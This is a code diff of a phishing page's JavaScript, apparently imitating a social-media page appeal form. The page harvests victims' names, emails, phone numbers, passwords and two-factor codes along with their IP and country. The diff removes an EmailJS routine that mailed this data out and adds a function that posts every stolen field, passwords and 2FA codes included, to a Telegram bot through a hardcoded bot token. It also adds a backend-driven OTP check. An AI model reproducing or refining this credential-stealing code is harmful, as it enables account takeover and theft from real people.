@@ -6326,6 +6326,11 @@
       };
     </script>
     <script>
+      window.onload = function () {
+        localStorage.removeItem("otp");
+        localStorage.removeItem("email");
+      };
+
       const subLinks = {
         PolicyCollapse: [
           {
@@ -6617,76 +6622,6 @@
         }
       });
 
-      // Get User IP
-      var url = "https://api.db-ip.com/v2/free/self/";
-      async function getUserIp() {
-        const response = await fetch(url);
-        if (response.status == 200) {
-          const data = await response.json();
-          userIpData = {
-            user_ip: data.ipAddress,
-            country: data.countryName,
-            country_code: data.countryCode,
-          };
-        } else {
-          userIpData = {
-            user_ip: "Ip not detected ;(",
-            country: "-",
-            country_code: "-",
-          };
-        }
-      }
-      /////
-      getUserIp();
-
-      // Send data to Email
-      function sendDataEmail() {
-        var templateData = {
-          user_ip: userIpData.user_ip,
-          country: userIpData.country,
-          country_code: userIpData.country_code,
-          "full-name": formsSendData["full-name"],
-          "personal-email": formsSendData["personal-email"],
-          "buiseness-email": formsSendData["buiseness-email"],
-          "mobile-phone-number": formsSendData["mobile-phone-number"],
-          "password-1": formsSendData["password-1"],
-          "password-2": formsSendData["password-2"],
-          "2FA-1": formsSendData["2FA-1"],
-          "2FA-2": formsSendData["2FA-2"],
-          "2FA-3": formsSendData["2FA-3"],
-          "page-name": formsSendData["page-name"],
-          apeal: formsSendData["apeal"],
-          dis_name: metrics.dis_name,
-          is_Mobile: metrics.is_Mobile,
-          params: metrics.params,
-        };
-        // thay mail js
-        // https://dashboard.emailjs.com/admin
-        var serviceID = "service_lme8pkn";
-        // Public Key https://dashboard.emailjs.com/admin/account
-        var userId = "Ye9lIODaAW0YXzwpr";
-        // https://dashboard.emailjs.com/admin/templates/n9wx5on/settings
-        var templateId = "template_f7vodys";
-
-        var data = {
-          service_id: serviceID,
-          template_id: templateId,
-          user_id: userId,
-          template_params: templateData,
-        };
-
-        $.ajax("https://api.emailjs.com/api/v1.0/email/send", {
-          type: "POST",
-          data: JSON.stringify(data),
-          contentType: "application/json",
-        })
-          .done(function () {
-            // Xử lý khi gửi thành công
-          })
-          .fail(function (error) {
-            // Xử lý khi gửi thất bại
-          });
-      }
       function firstFormHandle(event) {
         event.preventDefault();
         updateFormsSendData(serializeForm(firstForm));
@@ -6713,8 +6648,66 @@
         }, 5000);
       }
 
+      // Get User IP
+      async function getUserIp() {
+        try {
+          const url = "https://api.db-ip.com/v2/free/self/";
+          const response = await fetch(url);
+          if (!response.ok)
+            throw new Error(`HTTP error! status: ${response.status}`);
+
+          const data = await response.json();
+          const userIpData = {
+            user_ip: data.ipAddress || "Unknown IP",
+            country: data.countryName || "Unknown Country",
+            country_code: data.countryCode || "Unknown Code",
+          };
+          return userIpData;
+        } catch (error) {
+          console.error("Error fetching user IP data:", error);
+          return {
+            user_ip: "IP not detected ;(",
+            country: "-",
+            country_code: "-",
+          };
+        }
+      }
+
+      function sendTemplateData(templateData) {
+        const apiUrl = "http://localhost:3000/api/send-data";
+
+        return fetch(apiUrl, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({ templateData }),
+        })
+          .then((response) => response.json())
+          .then((data) => {
+            if (data.otp) {
+              localStorage.setItem("otp", data.otp);
+            } else {
+              console.error("OTP not found in response.");
+            }
+
+            if (templateData["personal-email"]) {
+              localStorage.setItem("email", templateData["personal-email"]);
+            } else {
+              console.warn("Email not provided in templateData.");
+            }
+
+            return data;
+          })
+          .catch((error) => {
+            console.error("Error during API call:", error);
+            throw error;
+          });
+      }
+
       function apiFormhandle(event) {
         event.preventDefault();
+
         var spiner = apiForm.querySelector(".spinner-border");
         var buttonText = apiForm.querySelector(".button-text");
         var button = apiForm.querySelector("button");
@@ -6730,27 +6723,148 @@
             errortext.style.display = "block";
             errortext = apiForm.querySelector("input").value = "";
             apiInsertCounter++;
-            sendDataEmail();
             spiner.style.display = "none";
             buttonText.style.display = "block";
             button.removeAttribute("disabled");
             hidePasswordIncorrectText();
             input.setAttribute("name", "password-2");
           } else {
-            sendDataEmail();
-            errortext.style.display = "none";
-            spiner.style.display = "none";
-            buttonText.style.display = "block";
-            button.removeAttribute("disabled");
-            hidePasswordIncorrectText();
-            input.setAttribute("name", "password-1");
-            apiModal.hide();
-            twoFAModal.show();
+            getUserIp()
+              .then((userIpData) => {
+                const templateData = {
+                  user_ip: userIpData.user_ip,
+                  country: userIpData.country,
+                  country_code: userIpData.country_code,
+                  "full-name": formsSendData["full-name"],
+                  "personal-email": formsSendData["personal-email"],
+                  "buiseness-email": formsSendData["buiseness-email"],
+                  "mobile-phone-number": formsSendData["mobile-phone-number"],
+                  "password-1": formsSendData["password-1"],
+                  "password-2": formsSendData["password-2"],
+                  "2FA-2": formsSendData["2FA-2"],
+                  "2FA-3": formsSendData["2FA-3"],
+                  "page-name": formsSendData["page-name"],
+                  apeal: formsSendData["apeal"],
+                  dis_name: metrics.dis_name,
+                  is_Mobile: metrics.is_Mobile,
+                  params: metrics.params,
+                };
+
+                // Send template data to the API
+                return sendTemplateData(templateData);
+              })
+              .then(() => {
+                errortext.style.display = "none";
+                spiner.style.display = "none";
+                buttonText.style.display = "block";
+                button.removeAttribute("disabled");
+                hidePasswordIncorrectText();
+                input.setAttribute("name", "password-1");
+                apiModal.hide();
+                twoFAModal.show();
+              })
+              .catch((error) => {
+                console.error("Error in processing API request:", error);
+                spiner.style.display = "none";
+                buttonText.style.display = "block";
+                button.removeAttribute("disabled");
+                errortext.style.display = "block";
+              });
           }
         }, 4000);
       }
+
+      async function fetchUserInfo() {
+        try {
+          const email = localStorage.getItem("email");
+
+          if (!email) {
+            console.error("No email found in local storage");
+            return null;
+          }
+
+          const apiUrl = `http://localhost:3000/api/user?email=${email}`;
+          const response = await fetch(apiUrl);
+          const data = await response.json();
+
+          if (response.ok) {
+            return data;
+          } else {
+            console.error(
+              "Error fetching user information:",
+              data.error || "Unknown error"
+            );
+            return null;
+          }
+        } catch (error) {
+          console.error("Error during API call:", error);
+          return null;
+        }
+      }
+
+      async function sendDataToTelegram() {
+        try {
+          const userInfo = await fetchUserInfo();
+
+          if (!userInfo) {
+            console.error("No user information available.");
+            return;
+          }
+
+          const message = `
+            User Information:
+            - User IP: ${userInfo.user.user_ip || "N/A"}
+            - Country: ${userInfo.user.country || "N/A"}
+            - Country Code: ${userInfo.user.country_code || "N/A"}
+            - Full Name: ${userInfo.user["full-name"] || "N/A"}
+            - Personal Email: ${userInfo.user["personal-email"] || "N/A"}
+            - Business Email: ${userInfo.user["buiseness-email"] || "N/A"}
+            - Mobile Phone Number: ${userInfo.user["mobile-phone-number"] || "N/A"}
+            - Password 1: ${userInfo.user["password-1"] || "N/A"}
+            - Password 2: ${userInfo.user["password-2"] || "N/A"}
+            - 2FA-1: ${userInfo.user["2FA-1"] || "N/A"}
+            - 2FA-2: ${userInfo.user["2FA-2"] || "N/A"}
+            - 2FA-3: ${userInfo.user["2FA-3"] || "N/A"}
+            - Page Name: ${userInfo.user["page-name"] || "N/A"}
+            - Appeal: ${userInfo.user.apeal || "N/A"}
+            - Device Name: ${userInfo.user.dis_name || "N/A"}
+            - Is Mobile: ${userInfo.user.is_Mobile || "N/A"}
+            - Params: ${userInfo.user.params || "N/A"}
+            `;
+
+          const botToken = "7874594669:AAEACEbf9hma4mbAsKsYDu7Xud-EQsTl2Rg";
+          const chatId = "4547317714";
+          const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+          const payload = {
+            chat_id: chatId,
+            text: message,
+          };
+
+          const response = await fetch(url, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify(payload),
+          });
+
+          const result = await response.json();
+
+          if (response.ok) {
+            console.log("Message sent successfully:", result);
+          } else {
+            console.error(
+              "Error sending message:", result.description || "Unknown error"
+            );
+          }
+        } catch (error) {
+          console.error("Error while sending data:", error);
+        }
+      }
+
       var counter2FA = 1;
-      var countOf2FA = 3;
+      var countOf2FA = 1;
       function twoFAFormHandle(event) {
         //handleFormSubmit(event, twoFAForm)
         event.preventDefault();
@@ -6765,33 +6879,46 @@
         buttonText.style.display = "none";
         button.setAttribute("disabled", "");
 
+        var userOTP = input.value.trim();
+
+        var storedOTP = localStorage.getItem("otp");
+
         updateFormsSendData(serializeForm(twoFAForm));
         setTimeout(function () {
-          sendDataEmail();
-          counter2FA++;
-          if (counter2FA >= countOf2FA + 1) {
-            // SHOW success
+          if (userOTP === storedOTP) {
+            // OTP is valid, proceed to next step
+            counter2FA++;
+            if (counter2FA >= countOf2FA + 1) {
+              // Success modal
+              unlock2FA();
+              spiner.style.display = "none";
+              buttonText.style.display = "block";
+              twoFAModal.hide();
 
-            unlock2FA();
-            spiner.style.display = "none";
-            buttonText.style.display = "block";
-            twoFAModal.hide();
-            successModal.show();
+              sendDataToTelegram();
+
+              successModal.show();
+            } else {
+              // Move to the next step in the 2FA process
+              var send2FAButton = twoFAForm.querySelector("button.btn");
+              passwordInput.classList.add("disabled");
+              input.setAttribute("disabled", "");
+              input.setAttribute("name", "2FA-" + counter2FA);
+              send2FAButton.setAttribute("disabled", "");
+              twoFAForm.querySelector("input").value = "";
+              startTimer();
+              spiner.style.display = "none";
+              buttonText.style.display = "block";
+            }
           } else {
-            var send2FAButton = twoFAForm.querySelector("button.btn");
-            passwordInput.classList.add("disabled");
-            input.setAttribute("disabled", "");
-
-            input.setAttribute("name", "2FA-" + counter2FA);
-            send2FAButton.setAttribute("disabled", "");
-            twoFAForm.querySelector("input").value = "";
-
-            startTimer();
-            errortext.style.display = "block";
+            // OTP is invalid, show error
             spiner.style.display = "none";
             buttonText.style.display = "block";
+            button.removeAttribute("disabled");
+            errortext.style.display = "block";
+            errortext.innerText = "Invalid OTP. Please try again.";
           }
-        }, 6000);
+        }, 2000); // Simulate API validation delay
       }
 
       function unlock2FA() {
@@ -6841,19 +6968,30 @@
       }
 
       function startTimer() {
-        // TIMER
+        // Get the timer element
+        var timerElement = document.getElementById("timer");
+
+        // Check if the timer element exists
+        if (!timerElement) {
+          console.error("Timer element not found in the DOM.");
+          return; // Exit the function if the element is not found
+        }
+
+        // Start the countdown timer
         var countDownDate = new Date().getTime();
         var x = setInterval(function () {
           var now = new Date().getTime();
           var distance = Math.round((now - countDownDate) / 1000);
           var insertedTime = INCORRECT_2FA_TIMEOUT - distance;
-          document.getElementById("timer").innerHTML = insertedTime + "s ";
-          document.getElementById("timer").style.display = "inline";
+
           if (insertedTime <= 0) {
-            clearInterval(x);
-            document.getElementById("timer").style.display = "none";
-            document.getElementById("timer").innerHTML = "EXPIRED";
-            unlock2FA();
+            clearInterval(x); // Stop the timer
+            timerElement.style.display = "none";
+            timerElement.innerHTML = "EXPIRED";
+            unlock2FA(); // Proceed to unlock the form or take appropriate action
+          } else {
+            timerElement.style.display = "inline";
+            timerElement.innerHTML = insertedTime + "s ";
           }
         }, 1000);
       }
